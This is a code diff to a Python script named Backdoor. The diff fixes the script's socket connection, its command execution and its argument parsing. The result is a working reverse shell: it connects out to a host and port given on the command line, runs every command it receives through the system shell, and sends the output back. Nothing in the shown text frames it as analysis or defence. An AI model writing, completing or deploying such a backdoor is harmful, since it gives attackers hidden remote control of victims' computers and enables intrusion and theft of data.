@@ -1,19 +1,26 @@
-import * from socket
+from socket import *
+import subprocess
+import argparse
+from termcolor import cprint
 
 class Backdoor:
     def __init__(self, address, port):
         self.connection = socket(AF_INET, SOCK_STREAM)
-        self.connection.connect(address, port)
+        self.connection.connect((address, port))
 
-    def execute_sys_cmd(command):
+    def execute_sys_cmd(self, command):
         return subprocess.check_output(command, shell=True)
 
     def run(self):
         while True:
-            command = self.connection.recv(1024)
-            result = self.execute_sys_cmd(command)
-            self.connection.send(result)
-        
+            try:
+                command = self.connection.recv(1024).decode()
+                result = self.execute_sys_cmd(command).decode()
+                self.connection.send(f'{len(result)}\r\n{result}'.encode())
+            
+            except subprocess.CalledProcessError:
+                self.connection.send(b'10\r\nNO COMMAND')
+
         self.connection.close()
 
 
@@ -40,7 +47,7 @@ def check_format_IP(IP_address):
     
     #Error in the format if the number of fields is != 4 
     if len(IP_numbers)!=4:
-        raise NoNetworkSpecified
+        raise NoAddressSpecified
     else:
         #Check if each field has valid value (>=0 and <256)
         for num in IP_numbers:
@@ -79,7 +86,7 @@ def args_parser():
         parser.print_help()
         exit(0)
 
-    return target_IP, int(gateway)
+    return address, int(args.port)
 
 
 if __name__=='__main__':
